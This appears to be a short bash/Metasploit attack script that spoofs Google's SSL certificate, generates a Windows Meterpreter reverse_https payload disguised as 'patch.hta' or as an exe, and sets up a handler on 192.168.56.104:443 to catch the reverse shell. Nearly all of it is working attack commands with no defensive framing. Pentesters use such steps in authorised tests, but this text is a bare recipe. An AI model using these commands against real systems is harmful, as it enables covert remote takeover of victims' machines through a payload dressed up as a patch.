#!/bin/bash
#Fake SSL Certificate
msfconsole -x "use auxiliary/gather/impersonate_ssl;set rhost www.google.com;exploit"

use windows/meterpreter/reverse_https
set lhost 192.168.56.104
set lport 443
set StagerVerifySSLCert true
set handlersslcert <certificate_path> # file.pem
# genrate file paylaod
generate -f hta-psh -o /root/patch.hta
# or
generate -t exe -f  /root/apyload.exe

# exploiting the target
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 192.168.56.104
set lport 443
set StagerVerifySSLCert true
set handlersslcert <certificate> # file.pem




